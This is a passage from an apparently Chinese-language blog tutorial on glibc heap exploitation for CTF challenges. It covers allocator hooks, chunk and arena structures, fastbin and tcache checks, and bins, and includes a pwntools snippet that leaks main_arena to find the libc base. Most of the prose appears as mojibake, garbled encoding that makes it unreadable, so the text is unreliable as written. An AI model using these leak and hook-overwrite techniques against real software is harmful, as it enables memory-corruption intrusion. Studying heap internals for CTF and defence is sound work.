†åˆ©ç”¨çš„èŒæ–°ï¼Œå¯¹äºå¯¹å †ç®¡ç†å™¨å·²ç»æœ‰ç€ä¸€å®šçš„äº†è§£æˆ–è€…å†å¾€ä¸Šçš„å¤§å¸ˆå‚…ä»¬è¯·æ— è§†</p><h3 id="å‰ç½®çŸ¥è¯†ï¼š"><a href="#å‰ç½®çŸ¥è¯†ï¼š" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h3><ul><li>x86æ±‡ç¼–è¯­è¨€åŸºç¡€</li><li>Cè¯­è¨€åŸºç¡€</li><li>æ•°æ®ç»“æ„åŸºç¡€ï¼ˆæ¨èè‡³å°‘è¦Leetcodeä¸Šçš„é“¾è¡¨é¢˜èƒ½å†™ä¸­ç­‰éš¾åº¦çš„æ°´å¹³ï¼ˆOIä½¬è¯·æ— è§†ï¼‰ï¼‰</li></ul><h2 id="0x01-å †å†…å­˜çš„åˆ†é…-amp-é‡Šæ”¾"><a href="#0x01-å †å†…å­˜çš„åˆ†é…-amp-é‡Šæ”¾" class="headerlink" title="0x01.å †å†…å­˜çš„åˆ†é…&amp;é‡Šæ”¾"></a>0x01.å †å†…å­˜çš„åˆ†é…&amp;é‡Šæ”¾</h2><p>å †å†…å­˜å¤§æ¦‚æ˜¯ä½äºå›¾ä¸Šçš„ä½ç½®ï¼Œå¢é•¿æ–¹å‘å¦‚ç®­å¤´æ‰€ç¤ºï¼š<strong>ä»ä½åœ°å€å‘é«˜åœ°å€å¢é•¿</strong></p><p><img src="https://i.loli.net/2020/12/16/BnJgR7Kd2VMYHhk.png" alt="image.png"></p><h3 id="ç³»ç»Ÿè°ƒç”¨ï¼šbrk"><a href="#ç³»ç»Ÿè°ƒç”¨ï¼šbrk" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨ï¼šbrk"></a>ç³»ç»Ÿè°ƒç”¨ï¼šbrk</h3><p>brkç³»ç»Ÿè°ƒç”¨ç”¨äºå¢é•¿å †åŒº</p><h3 id="å†…å­˜åˆ†é…åŸºæœ¬æ€æƒ³ï¼šé‡ç”¨"><a href="#å†…å­˜åˆ†é…åŸºæœ¬æ€æƒ³ï¼šé‡ç”¨" class="headerlink" title="å†…å­˜åˆ†é…åŸºæœ¬æ€æƒ³ï¼šé‡ç”¨"></a>å†…å­˜åˆ†é…åŸºæœ¬æ€æƒ³ï¼šé‡ç”¨</h3><p>å †ç®¡ç†å™¨å¤„äºç”¨æˆ·ç¨‹åºä¸å†…æ ¸ä¸­é—´ï¼Œä¸»è¦åšä»¥ä¸‹å·¥ä½œ</p><ol><li>å“åº”ç”¨æˆ·çš„ç”³è¯·å†…å­˜è¯·æ±‚ï¼Œå‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œç„¶åå°†å…¶è¿”å›ç»™ç”¨æˆ·ç¨‹åºã€‚åŒæ—¶ï¼Œä¸ºäº†ä¿æŒå†…å­˜ç®¡ç†çš„é«˜æ•ˆæ€§ï¼Œå†…æ ¸ä¸€èˆ¬éƒ½ä¼šé¢„å…ˆåˆ†é…å¾ˆå¤§çš„ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œç„¶åè®©å †ç®¡ç†å™¨é€šè¿‡æŸç§ç®—æ³•ç®¡ç†è¿™å—å†…å­˜ã€‚åªæœ‰å½“å‡ºç°äº†å †ç©ºé—´ä¸è¶³çš„æƒ…å†µï¼Œå †ç®¡ç†å™¨æ‰ä¼šå†æ¬¡ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚</li><li>ç®¡ç†ç”¨æˆ·æ‰€é‡Šæ”¾çš„å†…å­˜ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·é‡Šæ”¾çš„å†…å­˜å¹¶ä¸æ˜¯ç›´æ¥è¿”è¿˜ç»™æ“ä½œç³»ç»Ÿçš„ï¼Œè€Œæ˜¯ç”±å †ç®¡ç†å™¨è¿›è¡Œç®¡ç†ã€‚è¿™äº›é‡Šæ”¾çš„å†…å­˜å¯ä»¥æ¥å“åº”ç”¨æˆ·æ–°ç”³è¯·çš„å†…å­˜çš„è¯·æ±‚ã€‚</li></ol><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>malloc()å‡½æ•°ç”¨äºåˆ†é…chunkï¼Œç©ºé—²chunkä¸æ»¡è¶³æ¡ä»¶æ—¶ä¼šåˆå¹¶ç›¸é‚»ç©ºé—²chunk | åˆ‡å‰²ç©ºé—²chunk</p><h4 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="__malloc_hook"></a>__malloc_hook</h4><p>ä½äºlibcä¸­çš„å‡½æ•°æŒ‡é’ˆå˜é‡ï¼Œé€šå¸¸ä¸ºNULLï¼Œä¸ä¸ºNULLæ—¶malloc()å‡½æ•°ä¼šä¼˜å…ˆè°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆ</p><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>free()å‡½æ•°ç”¨äºå°†å¯¹åº”çš„ç©ºé—²chunkæ”¾å…¥ç›¸åº”çš„binä¸­ï¼Œè¿˜ä¼šåˆå¹¶ç›¸é‚»ç©ºé—²chunk</p><h4 id="free-hook"><a href="#free-hook" class="headerlink" title="__free_hook"></a>__free_hook</h4><p>ä½äºlibcä¸­çš„å‡½æ•°æŒ‡é’ˆå˜é‡ï¼Œé€šå¸¸ä¸ºNULLï¼Œä¸ä¸ºNULLæ—¶free()å‡½æ•°ä¼šä¼˜å…ˆè°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆï¼Œä¼ å…¥çš„å‚æ•°ä¸ºè¦freeçš„chunk</p><h3 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h3><p>ç”¨ä»¥æ‰©å±•chunkï¼Œç›¸é‚»chunké—²ç½®ä¸”ç©ºé—´å……è¶³åˆ™ä¼šè¿›è¡Œåˆå¹¶ï¼Œå¦åˆ™ä¼šé‡æ–°åˆ†é…chunk</p><h4 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="__realloc_hook"></a>__realloc_hook</h4><p>ä½äºlibcä¸­çš„å‡½æ•°æŒ‡é’ˆå˜é‡ï¼Œé€šå¸¸ä¸ºNULLï¼Œä¸ä¸ºNULLæ—¶realloc()å‡½æ•°ä¼šä¼˜å…ˆè°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆ</p><h2 id="0x02-å †ç›¸å…³æ•°æ®ç»“æ„"><a href="#0x02-å †ç›¸å…³æ•°æ®ç»“æ„" class="headerlink" title="0x02.å †ç›¸å…³æ•°æ®ç»“æ„"></a>0x02.å †ç›¸å…³æ•°æ®ç»“æ„</h2><p><strong>æ­¤éƒ¨åˆ†å†…å®¹æ¨èé˜…è¯»ï¼š<a href="https://arttnba3.cn/2021/01/15/NOTE-0X00-MALLOC-2.23-PART-I/"> glibc2.23mallocæºç åˆ†æ - Iï¼šå †å†…å­˜çš„åŸºæœ¬ç»„ç»‡å½¢å¼ </a>è¿›è¡Œæ·±å…¥ç†è§£ï¼Œè¿™é‡Œåªæ˜¯å¸®å¤§å®¶äº†è§£ä¸ªå¤§æ¦‚çš„æ ·å­</strong></p><h3 id="1-chunk"><a href="#1-chunk" class="headerlink" title="1.chunk"></a>1.chunk</h3><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†å‘ç³»ç»Ÿæ‰€ç”³è¯·å¾—åˆ°çš„å†…å­˜å—ç§°ä¹‹ä¸ºä¸€ä¸ª<strong>chunk</strong></p><h4 id="åŸºæœ¬ç»“æ„"><a href="#åŸºæœ¬ç»“æ„" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h4><p>åœ¨ptmallocçš„å†…éƒ¨ä½¿ç”¨malloc_chunkç»“æ„ä½“æ¥è¡¨ç¤ºï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å„å­—æ®µå«ä¹‰å¦‚ä¸‹ï¼š</p><ul><li><strong>prev_size</strong>:ç”¨ä»¥ä¿å­˜å‰ä¸€ä¸ªå†…å­˜ç‰©ç†åœ°å€ç›¸é‚»çš„chunkçš„sizeï¼Œ<strong>ä»…åœ¨è¯¥chunkä¸ºfreeçŠ¶æ€æ—¶ä¼šè¢«ä½¿ç”¨åˆ°</strong></li><li><strong>size</strong>ï¼šé¡¾åæ€ä¹‰ï¼Œç”¨ä»¥ä¿å­˜è¿™ä¸ªchunkçš„<strong>æ€»çš„å¤§å°ï¼Œå³åŒæ—¶åŒ…å«chunkå¤´</strong>ï¼ˆ<strong>prev_size + size</strong>ï¼‰<strong>å’Œchunkå‰©ä½™éƒ¨åˆ†çš„å¤§å°</strong></li><li><strong>fd</strong>&amp;&amp;<strong>bk</strong>ï¼š<strong>ä»…åœ¨åœ¨chunkè¢«freeåä½¿ç”¨</strong>ï¼Œç”¨ä»¥è¿æ¥å…¶ä»–çš„chunkï¼Œ<strong>ä¹Ÿå°±æ˜¯è¯´å½“chunkå¤„äºè¢«ä½¿ç”¨çš„çŠ¶æ€æ—¶è¯¥å­—æ®µæ— æ•ˆï¼Œè¢«ç”¨ä»¥å­˜å‚¨ç”¨æˆ·çš„æ•°æ®</strong></li><li><strong>fd_nextsize</strong>&amp;&amp;<strong>bk_nextsize</strong>ï¼šä»…åœ¨åœ¨chunkè¢«freeåä½¿ç”¨ï¼Œç”¨ä»¥è¿æ¥å…¶ä»–çš„chunk</li></ul><p>ç”±äºæœ€åçš„ä¸¤ä¸ªå˜é‡ä»…ç”¨äºè¾ƒå¤§çš„freeçš„chunkï¼Œæ•…æˆ‘ä»¬å…ˆæš‚ä¸”å¿½ç•¥</p><p>é‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥çŸ¥é“ï¼š<strong>ä¸€ä¸ªchunkåœ¨å†…å­˜ä¸­å¤§æ¦‚æ˜¯é•¿è¿™ä¸ªæ ·å­çš„</strong>ï¼š</p><p><img src="https://i.loli.net/2020/12/18/MAmvtL1zrpo9sFV.png" alt="image.png"></p><p>å…¶ä¸­prev_sizeå­—æ®µä¸sizeå­—æ®µè¢«ç§°ä¹‹ä¸ºchunk headerï¼Œç”¨ä»¥å­˜å‚¨chunkç›¸å…³æ•°æ®ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†æ‰æ˜¯ç³»ç»ŸçœŸæ­£è¿”å›ç»™ç”¨æˆ·è¿›è¡Œä½¿ç”¨çš„éƒ¨åˆ†</p><h4 id="Top-Chunk"><a href="#Top-Chunk" class="headerlink" title="Top Chunk"></a>Top Chunk</h4><p>Top Chunkæ˜¯æ‰€æœ‰chunkä¸­è¾ƒä¸ºç‰¹æ®Šçš„ä¸€ä¸ªchunkï¼Œç”±äºç³»ç»Ÿè°ƒç”¨çš„å¼€é”€è¾ƒå¤§ï¼Œæ•…ä¸€èˆ¬æƒ…å†µä¸‹mallocéƒ½ä¸ä¼šé¢‘ç¹åœ°ç›´æ¥è°ƒç”¨brkç³»ç»Ÿè°ƒç”¨å¼€è¾Ÿå †å†…å­˜ç©ºé—´ï¼Œè€Œæ˜¯ä¼šåœ¨ä¸€å¼€å§‹æ—¶å…ˆå‘ç³»ç»Ÿç”³è¯·ä¸€ä¸ªè¾ƒå¤§çš„Top Chunkï¼Œåç»­éœ€è¦å–ç”¨å†…å­˜æ—¶ä¾¿ä»Top chunkä¸­åˆ‡å‰²ï¼Œç›´åˆ°Top chunkä¸è¶³ä»¥åˆ†é…æ‰€éœ€å¤§å°çš„chunkæ—¶æ‰ä¼šè¿›è¡Œç³»ç»Ÿè°ƒç”¨</p><h3 id="2-arena"><a href="#2-arena" class="headerlink" title="2.arena"></a>2.arena</h3><p>arenaè¿™ä¸ªè¯ç›´è¯‘æ˜¯â€œç«æŠ€åœºâ€çš„æ„æ€ï¼Œ<del>wsmè¦èµ·è¿™ç§å¥‡æ€ªçš„åå­—æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œå¯èƒ½æ˜¯å› ä¸ºå¬èµ·æ¥æ¯”è¾ƒå¸…æ°”å§</del>ï¼ŒæŒ‰ç…§ç¬”è€…çš„ç†è§£ï¼Œarenaåœ¨ptmallocä¸­ç”¨ä»¥è¡¨ç¤º<strong>ã€Œå•ä¸ªçº¿ç¨‹ç‹¬ç«‹ç»´æŠ¤çš„å†…å­˜æ± ã€</strong>ï¼Œè¿™æ˜¯ç”±äºå¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯¹äºæ¯ä¸ªçº¿ç¨‹è€Œè¨€å…¶éƒ½ä¼šå•ç‹¬æœ‰ç€ä¸€ä¸ªarenaå®ä¾‹ç”¨ä»¥ç®¡ç†å±äºè¯¥çº¿ç¨‹çš„å †å†…å­˜åŒºåŸŸï¼ŒåŒ…æ‹¬Binsã€Fastbinç­‰å…¶å®éƒ½æ˜¯è¢«æ”¾ç½®åœ¨arenaçš„ç»“æ„ä½“ä¸­ç»Ÿä¸€è¿›è¡Œç®¡ç†çš„</p><h4 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h4><p>main_arenaä¸ºä¸€ä¸ªå®šä¹‰äºmalloc.cä¸­çš„é™æ€çš„malloc_stateç»“æ„ä½“ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span></span><br><span class="line"><span class="comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span></span><br><span class="line"><span class="comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span></span><br><span class="line"><span class="comment">   before using. This malloc relies on the property that malloc_state</span></span><br><span class="line"><span class="comment">   is initialized to all zeroes (as is true of C statics).  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>è¯¥arenaä½äºlibcä¸­</strong>ï¼Œè€Œå¹¶ä¸ä¼¼<strong>å…¶ä»–arenaä¸€èˆ¬ä½äºå †åŒº</strong></p><p>åœ¨å †é¢˜ä¸­é€šå¸¸é€šè¿‡æ³„éœ²arenaçš„åœ°å€ä»¥è·å¾—libcçš„åŸºå€</p><h4 id="â‘ fast-bin"><a href="#â‘ fast-bin" class="headerlink" title="â‘ fast bin"></a>â‘ fast bin</h4><p>ptmalloc<strong>ç‹¬ç«‹äºBinsä¹‹å¤–å•ç‹¬è®¾è®¡äº†ä¸€ä¸ªFastbinç”¨ä»¥å‚¨å­˜ä¸€äº›sizeè¾ƒå°çš„é—²ç½®chunk</strong></p><ul><li>Fastbinsæ˜¯ä¸€ä¸ªç”¨ä»¥ä¿å­˜æœ€è¿‘é‡Šæ”¾çš„è¾ƒå°çš„chunkçš„æ•°ç»„ï¼Œä¸ºäº†æé«˜é€Ÿåº¦å…¶<strong>ä½¿ç”¨å•å‘é“¾è¡¨è¿›è¡Œé“¾æ¥</strong></li><li><strong>Fastbiné‡‡å–FILO&#x2F;LIFOçš„ç­–ç•¥ï¼Œå³æ¯æ¬¡éƒ½å–ç”¨fastbiné“¾è¡¨å¤´éƒ¨çš„chunkï¼Œæ¯æ¬¡é‡Šæ”¾chunkæ—¶éƒ½æ’å…¥è‡³é“¾è¡¨å¤´éƒ¨æˆä¸ºæ–°çš„å¤´ç»“ç‚¹</strong>ï¼Œå› è€Œå¤§å¹…æé«˜äº†å­˜å–chunkçš„é€Ÿåº¦</li><li><strong>Fastbinä¸­çš„chunkæ°¸è¿œä¿æŒåœ¨in_useçš„çŠ¶æ€ï¼Œè¿™ä¹Ÿä¿è¯äº†å¥¹ä»¬ä¸ä¼šè¢«ä¸å…¶ä»–çš„free chunkåˆå¹¶</strong></li><li><strong>malloc_consolidate()å‡½æ•°å°†ä¼šæ¸…ç©ºfastbinä¸­æ‰€æœ‰çš„chunkï¼Œåœ¨è¿›è¡Œç›¸åº”çš„åˆå¹¶åé€å…¥æ™®é€šçš„small binsä¸­</strong></li><li><strong>32ä½ä¸‹æœ€å¤§çš„fastbin chunk sizeä¸º0x40ï¼Œ 64ä½ä¸‹æœ€å¤§çš„fastbin chunk sizeä¸º0x80ï¼Œè¶…è¿‡è¿™ä¸ªèŒƒå›´çš„chunkåœ¨freeä¹‹ååˆ™ä¼šè¢«é€å…¥unsorted binä¸­</strong></li></ul><h5 id="å®‰å…¨æ£€æŸ¥"><a href="#å®‰å…¨æ£€æŸ¥" class="headerlink" title="å®‰å…¨æ£€æŸ¥"></a>å®‰å…¨æ£€æŸ¥</h5><h6 id="size"><a href="#size" class="headerlink" title="size"></a>size</h6><p>åœ¨malloc()å‡½æ•°åˆ†é…fastbin sizeèŒƒå›´çš„chunkæ—¶ï¼Œè‹¥æ˜¯å¯¹åº”çš„fastbinä¸­æœ‰ç©ºé—²chunkï¼Œåœ¨å–å‡ºå‰ä¼šæ£€æŸ¥å…¶sizeåŸŸä¸å¯¹åº”ä¸‹æ ‡æ˜¯å¦ä¸€è‡´ï¼Œ<strong>ä¸ä¼šæ£€æŸ¥æ ‡å¿—ä½</strong>ï¼Œè‹¥å¦åˆ™ä¼šè§¦å‘abort</p><h6 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h6><p>åœ¨free()å‡½æ•°ä¸­ä¼šå¯¹fastbiné“¾è¡¨çš„<strong>å¤´ç»“ç‚¹</strong>è¿›è¡Œæ£€æŸ¥ï¼Œè‹¥ä¼ å…¥free()çš„chunkå¤„åœ¨fastbin sizeèŒƒå›´å†…ï¼Œå…¶<strong>ä¸å¯¹åº”ä¸‹æ ‡çš„é“¾è¡¨çš„å¤´ç»“ç‚¹ä¸ºåŒä¸€chunkï¼Œåˆ™ä¼šè§¦å‘abort</strong></p><h4 id="â‘¡tcacheï¼ˆonly-libc2-26-and-upï¼‰"><a href="#â‘¡tcacheï¼ˆonly-libc2-26-and-upï¼‰" class="headerlink" title="â‘¡tcacheï¼ˆonly libc2.26 and upï¼‰"></a>â‘¡tcacheï¼ˆonly libc2.26 and upï¼‰</h4><p>Thread Cache(tcache)æœºåˆ¶ç”¨ä»¥å¿«é€Ÿå­˜å–chunkï¼Œä½¿ç”¨ä¸€ä¸ªç»“æ„ä½“è¿›è¡Œç®¡ç†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>tcacheä¸­ä¸€å…±æœ‰64ä¸ªentriesï¼Œæ¯ä¸ªentriesä½¿ç”¨å¦‚ä¸‹ç»“æ„ä½“è¿›è¡Œç®¡ç†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>å³tcacheä¸­çš„chunkä½¿ç”¨fdåŸŸè¿æ¥ï¼Œå¹¶ä½¿ç”¨bkåŸŸä¿å­˜tcache key</p><p>ä¸æ™®é€šçš„binæ‰€ä¸åŒçš„æ˜¯ï¼Œtcacheä¸­ç©ºé—²chunkçš„fdåŸŸæŒ‡å‘çš„å¹¶éæ˜¯ä¸‹ä¸€ä¸ªchunkçš„prev_sizeåŸŸï¼Œä»æ˜¯fdåŸŸ</p><h5 id="å®‰å…¨æ£€æŸ¥-1"><a href="#å®‰å…¨æ£€æŸ¥-1" class="headerlink" title="å®‰å…¨æ£€æŸ¥"></a>å®‰å…¨æ£€æŸ¥</h5><p>tcacheæœºåˆ¶åˆšå‡ºæ¥æ—¶åŸºæœ¬ä¸Šæ˜¯æ¯«æ— ä¿æŠ¤çš„ï¼Œå› æ­¤å¯¹äºtcacheçš„åˆ©ç”¨æ¯”ä»¥å¾€è¦ç®€å•å¾—å¤šï¼ˆæ¯”å¦‚è¯´å¯ä»¥ç›´æ¥double freeã€ä»»æ„åœ°å€å†™ç­‰</p><h6 id="tcache-keyï¼ˆonly-libc2-29-and-upï¼‰"><a href="#tcache-keyï¼ˆonly-libc2-29-and-upï¼‰" class="headerlink" title="tcache keyï¼ˆonly libc2.29 and upï¼‰"></a>tcache keyï¼ˆonly libc2.29 and upï¼‰</h6><p>è‡ªglibc2.29ç‰ˆæœ¬èµ·tcacheæ–°å¢äº†ä¸€ä¸ªkeyå­—æ®µï¼Œè¯¥å­—æ®µä½äºchunkçš„bkå­—æ®µï¼Œå€¼ä¸ºtcacheç»“æ„ä½“çš„åœ°å€ï¼Œè‹¥free()æ£€æµ‹åˆ°chunk-&gt;bk &#x3D;&#x3D; tcacheåˆ™ä¼šéå†tcacheå¯¹åº”é“¾è¡¨ä¸­æ˜¯å¦æœ‰è¯¥chunk</p><h4 id="â‘¢unsorted-bin"><a href="#â‘¢unsorted-bin" class="headerlink" title="â‘¢unsorted bin"></a>â‘¢unsorted bin</h4><p>ç”¨ä»¥ä¸´æ—¶å­˜æ”¾å †å—çš„binï¼Œsizeå¤§äºfastbinèŒƒå›´ã€tcacheé“¾è¡¨å·²æ»¡ï¼ˆå¦‚æœæœ‰tcacheï¼‰æ—¶ä¸€ä¸ªchunkåœ¨freeä¹‹ååˆ™ä¼šå…ˆè¢«æ”¾å…¥unsorted binä¸­</p><p>è‹¥è¢«æ”¾å…¥unsorted binä¸­çš„chunkä¸åŸæœ‰chunkç‰©ç†ç›¸é‚»åˆ™ä¼šåˆå¹¶æˆä¸€ä¸ªå¤§chunk</p><h4 id="â‘£small-bin"><a href="#â‘£small-bin" class="headerlink" title="â‘£small bin"></a>â‘£small bin</h4><p>å­˜æ”¾sizeè¾ƒå°çš„ç©ºé—²chunkçš„bin</p><h4 id="â‘¤large-bin"><a href="#â‘¤large-bin" class="headerlink" title="â‘¤large bin"></a>â‘¤large bin</h4><p>å­˜æ”¾sizeè¾ƒå¤§çš„ç©ºé—²chunkçš„bin</p><h2 id="0x03-åŸºç¡€çš„åˆ©ç”¨æ–¹å¼"><a href="#0x03-åŸºç¡€çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="0x03.åŸºç¡€çš„åˆ©ç”¨æ–¹å¼"></a>0x03.åŸºç¡€çš„åˆ©ç”¨æ–¹å¼</h2><h3 id="ä¸€ã€åœ°å€æ³„éœ²"><a href="#ä¸€ã€åœ°å€æ³„éœ²" class="headerlink" title="ä¸€ã€åœ°å€æ³„éœ²"></a>ä¸€ã€åœ°å€æ³„éœ²</h3><p>ä¸ret2libcç›¸åŒï¼ŒCTFçš„å †é¢˜ä¸­å¾€å¾€ä¸ä¼šç›´æ¥ç»™æˆ‘ä»¬åé—¨å‡½æ•°ï¼ŒåŒæ—¶åœ°å€éšæœºåŒ–ä¿æŠ¤å¾€å¾€ä¹Ÿéƒ½æ˜¯å¼€ç€çš„ï¼ˆå‡†ç¡®åœ°è¯´ï¼Œå‡ ä¹æ‰€æœ‰çš„å †é¢˜éƒ½æ˜¯<strong>ä¿  æŠ¤  å…¨  å¼€</strong>ï¼‰ï¼Œæ•…æˆ‘ä»¬ä»ç„¶éœ€è¦åˆ©ç”¨libcä¸­çš„gadgetä»¥è·å¾—flag</p><h4 id="bins-libcåŸºå€"><a href="#bins-libcåŸºå€" class="headerlink" title="bins - libcåŸºå€"></a>bins - libcåŸºå€</h4><p>ï¼ˆé™¤fastbinä»¥å¤–ï¼‰binsä¸ç©ºé—²chunké—´æ„æˆåŒå‘é“¾è¡¨ç»“æ„ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§æˆ‘ä»¬ä¾¿å¯ä»¥æ³„æ¼å‡ºmain_arenaçš„åœ°å€ï¼Œè¿›è€Œæ³„æ¼å‡ºlibcçš„åŸºå€</p><p>gdbè°ƒè¯•å¯ä»¥æ–¹ä¾¿æˆ‘ä»¬çŸ¥é“chunkä¸Šæ‰€è®°è½½çš„ä¸main_arenaé—´çš„åç§»</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åˆ©ç”¨unsorted binä¸­çš„chunkæ³„éœ²libcåœ°å€ï¼Œå…¶ä¸main_arenaé—´è·ç¦»ä¸º0x58&#x2F;0x60(libc2.26 and upï¼Œ with tcache)ï¼Œè€Œmain_arenaä¸__malloc_hooké—´åœ°å€ç›¸å·®0x10ï¼Œæ•…æœ‰å¦‚ä¸‹æ¿å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span> <span class="comment"># tcache</span></span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span> <span class="comment"># no tcache</span></span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - offset <span class="comment"># other condition(not unsorted bin leak)</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br></pre></td></tr></table></figure><p>è¿™ç§åˆ©ç”¨çš„æ–¹å¼å¯ä»¥æ˜¯é€šè¿‡å‚æ‚¬æŒ‡é’ˆæ‰“å°binsä¸­chunkå†…å®¹ï¼Œä¹Ÿå¯ä»¥æ˜¯é€šè¿‡é€å…¥binsåå†åˆ†é…å›æ¥æ‰“å°åˆ©ç”¨å‚æ‚¬æŒ‡é’ˆè¿›è¡Œæ³„éœ²</p><h4 id="tcache-key-å †åŸºå€ï¼ˆonly-libc2-29-and-upï¼‰"><a href="#tcache-key-å †åŸºå€ï¼ˆonly-libc2-29-and-upï¼‰" class="headerlink" title="tcache key - å †åŸºå€ï¼ˆonly libc2.29 and 